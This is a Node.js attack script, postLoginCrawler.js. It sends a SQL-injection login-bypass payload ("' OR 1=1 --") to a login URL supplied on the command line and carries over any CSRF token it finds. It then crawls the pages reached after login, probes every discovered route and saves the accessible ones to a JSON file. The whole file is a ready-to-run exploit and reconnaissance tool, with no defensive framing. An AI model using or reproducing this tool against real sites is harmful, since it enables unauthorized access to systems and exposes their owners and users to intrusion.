// postLoginCrawler.js - Sakti + CSRF + Logging Mode
const axios = require('axios').default;
const tough = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const jsdom = require('jsdom');
const fs = require('fs');
const { JSDOM } = jsdom;

const payload = { username: "' OR 1=1 --", password: "any" };

async function crawlAfterLogin(url) {
  const jar = new tough.CookieJar();
  const client = wrapper(axios.create({ jar }));

  const base = new URL(url).origin;
  let activeLinks = [];

  try {
    // Initial GET to extract CSRF if any
    const loginPage = await client.get(url);
    const dom = new JSDOM(loginPage.data);
    const tokenField = dom.window.document.querySelector('input[type="hidden"]');
    if (tokenField) {
      const tokenName = tokenField.getAttribute('name');
      const tokenValue = tokenField.getAttribute('value');
      if (tokenName && tokenValue) {
        payload[tokenName] = tokenValue;
        console.log(`🔐 Found CSRF token: ${tokenName}=${tokenValue}`);
      }
    }

    // Attempt login
    console.log(`[LOGIN] Bypassing ${url}`);
    const loginRes = await client.post(url, payload, { maxRedirects: 5 });

    // Get landing page after login
    const mainPage = await client.get(url.replace(/\/login.*/i, '/'));
    const doc = new JSDOM(mainPage.data).window.document;

    // Extract links
    const links = [...doc.querySelectorAll('a')].map(a => a.href);
    const forms = [...doc.querySelectorAll('form')].map(f => f.getAttribute('action')).filter(Boolean);
    const onclicks = [...doc.querySelectorAll('[onclick]')]
      .map(el => el.getAttribute('onclick'))
      .flatMap(code => code.match(/['"]([^'"]+)['"]/g) || [])
      .map(x => x.replace(/['"]/g, ''));
    const scripts = [...doc.querySelectorAll('script')]
      .map(script => script.textContent)
      .flatMap(text => text.match(/https?:\/\/[\w\.-\/]+/g) || []);

    const allPaths = [...links, ...forms, ...onclicks, ...scripts]
      .filter(Boolean)
      .map(p => (p.startsWith('/') ? base + p : p));
    const uniqueLinks = [...new Set(allPaths)];

    console.log(`\n🔗 Found ${uniqueLinks.length} routes. Testing access...`);

    for (let link of uniqueLinks) {
      try {
        const res = await client.get(link);
        console.log(`✅ ${res.status} - ${link}`);
        activeLinks.push({ url: link, status: res.status });
      } catch (e) {
        console.log(`❌ ${e.response?.status || 'ERR'} - ${link}`);
      }
    }

    fs.writeFileSync("active_links.json", JSON.stringify(activeLinks, null, 2));
    console.log("📁 Active links saved to active_links.json");

  } catch (e) {
    console.error(`❌ Error during login or crawling: ${e.message}`);
  }
}

const target = process.argv[2];
if (!target) {
  console.error("❌ Provide a login URL.");
  process.exit(1);
}

crawlAfterLogin(target);
